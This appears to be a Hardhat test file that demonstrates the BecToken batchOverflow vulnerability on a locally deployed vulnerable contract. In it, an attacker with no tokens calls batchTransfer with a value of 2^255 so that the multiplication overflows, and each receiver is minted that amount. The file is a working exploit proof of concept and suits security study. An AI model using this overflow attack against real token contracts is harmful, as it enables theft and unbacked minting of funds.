const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("ATTACK | BecToken batchOverflow (multiplication) - VULNERABLE contract only", function () {
  it("attacker with 0 tokens mints 2^255 tokens to each receiver", async function () {
    const HUGE = 2n ** 255n; // 2 * 2^255 = 2^256 -> 0
    const [, attacker, r1, r2] = await ethers.getSigners();
    const bec = await (await ethers.getContractFactory("BecToken")).deploy();
    console.log("      totalSupply  :", (await bec.totalSupply()).toString());
    console.log("      r1 before    :", (await bec.balanceOf(r1.address)).toString());
    await bec.connect(attacker).batchTransfer([r1.address, r2.address], HUGE);
    console.log("      r1 after     :", (await bec.balanceOf(r1.address)).toString());
    expect(await bec.balanceOf(r1.address)).to.equal(HUGE);
    expect(await bec.balanceOf(r2.address)).to.equal(HUGE);
  });
});
